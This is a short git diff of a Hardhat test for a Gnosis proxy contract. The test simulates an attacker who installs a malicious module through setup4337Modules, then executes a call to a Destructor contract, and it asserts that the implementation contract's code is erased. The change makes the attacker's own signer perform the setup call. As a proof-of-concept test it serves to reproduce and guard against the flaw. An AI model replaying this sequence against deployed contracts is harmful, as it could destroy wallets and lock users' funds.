@@ -109,7 +109,7 @@ describe('Gnosis Proxy', function () {
       const attacker = (await ethers.getSigners())[10];
       const destructor = await(await ethers.getContractFactory("Destructor")).deploy();
       await malicious.set(attacker.address, attacker.address);
-      await manager.setup4337Modules(malicious.address);
+      await manager.connect(attacker).setup4337Modules(malicious.address);
       await manager.connect(attacker).execTransactionFromModule(destructor.address, 0, "0x", 1);
       expect(await ethers.provider.getCode(manager.address)).to.be.equal("0x");
       // implementation contract is now destroyed
